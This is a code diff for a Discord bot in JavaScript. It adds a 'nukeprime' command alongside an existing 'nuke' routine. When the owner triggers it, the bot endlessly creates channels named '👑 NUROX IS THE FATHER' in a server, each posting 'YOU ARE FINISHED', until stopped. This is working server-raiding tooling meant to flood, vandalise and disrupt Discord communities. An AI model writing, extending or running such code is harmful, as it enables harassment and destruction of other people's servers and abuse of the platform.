@@ -30,6 +30,11 @@ const commands = [
     .setContexts([0, 1, 2])
     .setIntegrationTypes([0, 1]),
   new SlashCommandBuilder()
+    .setName('nukeprime')
+    .setDescription('Start infinite channel nuke process')
+    .setContexts([0, 1, 2])
+    .setIntegrationTypes([0, 1]),
+  new SlashCommandBuilder()
     .setName('stop')
     .setDescription('Stop nuke process')
     .setContexts([0, 1, 2])
@@ -77,7 +82,7 @@ client.on('messageCreate', async (message) => {
     return;
   }
 
-  if (content === 'nuke' || content === 'stop') {
+  if (content === 'nuke' || content === 'nukeprime' || content === 'stop') {
     if (message.author.id !== OWNER_ID) {
       return message.reply('❌ You are not NUROX to use this command!');
     }
@@ -98,6 +103,31 @@ client.on('messageCreate', async (message) => {
           console.error('Error sending message:', err);
         }
         await new Promise(resolve => setTimeout(resolve, 2000));
+      }
+      return;
+    }
+
+    if (content === 'nukeprime') {
+      if (!message.guild) {
+        return message.reply('This command can only be used in a server!');
+      }
+      if (isNuking) {
+        return message.reply('Nuke process standardly running already!');
+      }
+      isNuking = true;
+      await message.reply('💣 Nuke Prime Activated!');
+
+      while (isNuking && message.guild) {
+        try {
+          const channel = await message.guild.channels.create({
+            name: '👑 NUROX IS THE FATHER',
+            type: 0
+          });
+          await channel.send('YOU ARE FINISHED');
+        } catch (err) {
+          console.error('Error creating channel:', err);
+        }
+        await new Promise(resolve => setTimeout(resolve, 1000));
       }
       return;
     }
@@ -190,6 +220,31 @@ client.on('interactionCreate', async (interaction) => {
         }
       }
       await new Promise(resolve => setTimeout(resolve, 2000));
+    }
+  }
+
+  if (commandName === 'nukeprime') {
+    if (!interaction.guild) {
+      return interaction.reply({ content: 'This command can only be used in a server!', ephemeral: true });
+    }
+    if (isNuking) {
+      return interaction.reply({ content: 'Nuke process standardly running already!', ephemeral: true });
+    }
+
+    isNuking = true;
+    await interaction.reply({ content: '💣 Nuke Prime Activated!' });
+    
+    while (isNuking && interaction.guild) {
+      try {
+        const channel = await interaction.guild.channels.create({
+          name: '👑 NUROX IS THE FATHER',
+          type: 0
+        });
+        await channel.send('YOU ARE FINISHED');
+      } catch (err) {
+        console.error('Error creating channel:', err);
+      }
+      await new Promise(resolve => setTimeout(resolve, 1000));
     }
   }
 
